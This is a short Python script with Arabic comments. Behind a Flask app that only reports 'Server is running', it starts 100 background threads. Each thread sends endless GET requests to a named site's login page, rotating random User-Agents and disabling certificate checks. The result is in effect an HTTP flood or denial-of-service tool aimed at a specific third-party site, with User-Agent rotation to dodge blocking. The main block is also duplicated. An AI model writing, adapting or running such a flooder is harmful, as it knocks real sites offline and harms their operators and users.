from flask import Flask
import requests
import threading
from bs4 import BeautifulSoup
import urllib3
from fake_useragent import UserAgent

app = Flask(__name__)

# تعطيل تحذيرات SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

ua = UserAgent()

def chek(url):
    while True:
        try:
            headers = {"User-Agent": ua.random}  # تعيين User-Agent عشوائي
            response = requests.get(url, headers=headers, verify=False)  # تجاوز فحص الشهادة
            status_code = response.status_code
            soup = BeautifulSoup(response.text, "html.parser")
            title = soup.title.string if soup.title else "No Title"
            print(f"[{status_code}] {title} - {url} | UA: {headers['User-Agent']}")
        except requests.exceptions.RequestException:
            print("Request failed")

def start_threads():
    target_url = "https://alamdar-mod.com/Revenge/public/login"  # ضع الرابط هنا
    for _ in range(100):
        thread = threading.Thread(target=chek, args=(target_url,))
        thread.daemon = True
        thread.start()

@app.route('/')
def home():
    return "Server is running with background threads!"

if __name__ == '__main__':
    threading.Thread(target=start_threads, daemon=True).start()
    app.run(host='0.0.0.0', port=5000)
if __name__ == '__main__':
    threading.Thread(target=start_threads, daemon=True).start()
    app.run(host='0.0.0.0', port=5000)
